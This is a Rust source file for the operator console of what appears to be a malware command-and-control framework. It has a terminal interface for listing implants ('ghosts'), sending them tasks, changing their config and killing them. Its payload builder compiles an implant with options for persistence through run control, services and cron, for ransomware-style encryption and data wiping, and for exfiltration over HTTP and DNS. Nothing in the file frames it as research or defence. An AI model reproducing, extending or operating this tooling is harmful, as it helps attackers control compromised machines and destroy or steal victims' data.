mod action;
mod client;
mod models;
mod state;
mod ui;
mod update;

use crate::action::Action;
use crate::client::{C2Client, RealClient};
use crate::state::AppState;
use crate::update::Command;

use crossterm::{
    event::{self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen}
};
use ratatui::{backend::CrosstermBackend, Terminal};
use std::io;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::mpsc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    enable_raw_mode()?;
    let mut stdout = io::stdout();
    execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let c2_client: Arc<dyn C2Client> = Arc::new(RealClient::new());
    let mut app_state = AppState::default();

    let (action_tx, mut action_rx) = mpsc::channel(100);

    let _ = action_tx.send(Action::Tick).await;
    let init_tx = action_tx.clone();
    let init_client = c2_client.clone();

    tokio::spawn(async move {
        let res = init_client.fetch_ghosts().await;
        let _ = init_tx.send(Action::ReceiveGhosts(res)).await;
    });

    let tick_rate = Duration::from_millis(250);
    let mut last_tick = Instant::now();

    let refresh_rate = Duration::from_secs(5);
    let mut last_refresh = Instant::now();

    loop {
        terminal.draw(|f| ui::draw(f, &app_state))?;

        let mut should_process_action = None;

        if crossterm::event::poll(Duration::from_millis(10))? {
            if let Event::Key(key) = event::read()? {
                let action = match key.code {
                    KeyCode::Char(c) => Some(Action::Char(c)),
                    KeyCode::Enter => Some(Action::Enter),
                    KeyCode::Esc => Some(Action::Esc),
                    KeyCode::Backspace => Some(Action::Backspace),
                    KeyCode::Up => Some(Action::Up),
                    KeyCode::Down => Some(Action::Down),
                    KeyCode::Left => Some(Action::Left),
                    KeyCode::Right => Some(Action::Right),
                    KeyCode::Tab => Some(Action::NextTab),
                    KeyCode::BackTab => Some(Action::PrevTab),
                    _ => None
                };

                if let Some(a) = action {
                    should_process_action = Some(a);
                }
            }
        }

        if let Ok(action) = action_rx.try_recv() {
            should_process_action = Some(action);
        }

        if last_tick.elapsed() >= tick_rate {
            if should_process_action.is_none() {
                should_process_action = Some(Action::Tick);
            }

            last_tick = Instant::now();
        }

        if last_refresh.elapsed() >= refresh_rate {
            let _ = action_tx.try_send(Action::AutoRefresh);
            last_refresh = Instant::now();
        }

        if let Some(action) = should_process_action {
            let command = update::update(&mut app_state, action);

            if let Some(cmd) = command {
                match cmd {
                    Command::Quit => break,
                    _ => {
                        let tx = action_tx.clone();
                        let c = c2_client.clone();

                        tokio::spawn(async move {
                            handle_command(cmd, c, tx).await;
                        });
                    }
                }
            }
        }
    }

    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen, DisableMouseCapture)?;
    terminal.show_cursor()?;

    Ok(())
}

async fn handle_command(cmd: Command, client: Arc<dyn C2Client>, tx: mpsc::Sender<Action>) {
    match cmd {
        Command::FetchGhosts => {
            let res = client.fetch_ghosts().await;
            let _ = tx.send(Action::ReceiveGhosts(res)).await;
        },
        Command::FetchTasks(ghost_id) => {
            let res = client.fetch_tasks(&ghost_id).await;
            let _ = tx.send(Action::ReceiveTasks(res)).await;
        },
        Command::SendTask { ghost_id, req } => {
            let res = client.send_task(&ghost_id, req).await;
            let _ = tx.send(Action::ReceiveTaskSendResult(res)).await;
        },
        Command::UpdateGhostConfig { ghost_id, config } => {
            let res = client.update_config(&ghost_id, config).await;
            let _ = tx.send(Action::ReceiveConfigUpdateResult(res)).await;
        },
        Command::KillGhost(ghost_id) => {
            let res = client.kill_ghost(&ghost_id).await;
            let _ = tx.send(Action::ReceiveKillResult(res)).await;
        },
        Command::BuildPayload {
            url, port, debug,
            persistence, persist_runcontrol, persist_service, persist_cron,
            impact, impact_encrypt, impact_wipe,
            exfil, exfil_http, exfil_dns
        } => {
            let res = tokio::task::spawn_blocking(move || {
                use std::process::Command;

                let source_dir = "../GHOST";
                let build_dir = format!("{}/build", source_dir);

                let status = Command::new("cmake")
                    .arg("-S").arg(source_dir)
                    .arg("-B").arg(&build_dir)
                    .arg(format!("-DSHADOW_URL={}", url))
                    .arg(format!("-DSHADOW_PORT={}", port))
                    .arg(format!("-DENABLE_DEBUG={}", if debug { "ON" } else { "OFF" }))
                    .arg(format!("-DENABLE_PERSISTENCE={}", if persistence { "ON" } else { "OFF" }))
                    .arg(format!("-DPERSIST_RUNCONTROL={}", if persist_runcontrol { "ON" } else { "OFF" }))
                    .arg(format!("-DPERSIST_SERVICE={}", if persist_service { "ON" } else { "OFF" }))
                    .arg(format!("-DPERSIST_CRON={}", if persist_cron { "ON" } else { "OFF" }))
                    .arg(format!("-DENABLE_IMPACT={}", if impact { "ON" } else { "OFF" }))
                    .arg(format!("-DIMPACT_ENCRYPT={}", if impact_encrypt { "ON" } else { "OFF" }))
                    .arg(format!("-DIMPACT_WIPE={}", if impact_wipe { "ON" } else { "OFF" }))
                    .arg(format!("-DENABLE_EXFIL={}", if exfil { "ON" } else { "OFF" }))
                    .arg(format!("-DEXFIL_HTTP={}", if exfil_http { "ON" } else { "OFF" }))
                    .arg(format!("-DEXFIL_DNS={}", if exfil_dns { "ON" } else { "OFF" }))
                    .output();

                match status {
                    Ok(out) if !out.status.success() => return Err(format!("CMake config failed: {}", String::from_utf8_lossy(&out.stderr))),
                    Err(e) => return Err(format!("Failed to run cmake: {}", e)),
                    _ => {}
                }

                let build = Command::new("cmake")
                    .arg("--build").arg(&build_dir)
                    .arg("--config").arg("Release")
                    .output();
                
                match build {
                    Ok(out) => {
                        if out.status.success() {
                            Ok("Payload built successfully at ../GHOST/build/bin/Ghost".to_string())
                        } else {
                            Err(format!("Build failed: {}", String::from_utf8_lossy(&out.stderr)))
                        }
                    },
                    Err(e) => Err(format!("Failed to run cmake build: {}", e))
                }
            }).await.unwrap_or(Err("Join error".to_string()));

            let _ = tx.send(Action::ReceiveBuildResult(res)).await;
        },
        Command::Quit => {}
    }
}
